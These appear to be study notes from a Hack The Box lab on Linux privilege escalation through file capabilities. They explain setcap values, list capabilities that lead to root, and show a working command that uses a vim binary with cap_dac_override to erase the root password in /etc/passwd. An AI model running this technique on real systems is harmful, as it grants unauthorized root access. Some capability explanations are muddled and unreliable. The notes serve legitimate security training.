
---

`setcap` : To set capabilities for specific executables.

Capabibity Value :
	`=` : This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.

	`+ep` : This value grants the ***effective*** and ***permitted*** privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.

	`ei` : This value grants sufficient and ***inheritable privileges*** for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.

	`+p` : This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.


Several Linux capabilities can be used to escalate a user's privileges to root :

cap_setuid : Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.

cap_setgid : Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.

cap_sys_admin : This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.

cap_dac_override : Allows bypassing of file read, write, and execute permission checks.

## Enumerating Capabilities

---

```bash

hcx05@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep

```

```bash

hcx05@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
	# -e : keybord emulating
	# :%s/^root:[^:]*:/root::/ : substitude root:something: to root ::
	# -es : Ex and Silent mode

hcx05@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash

```














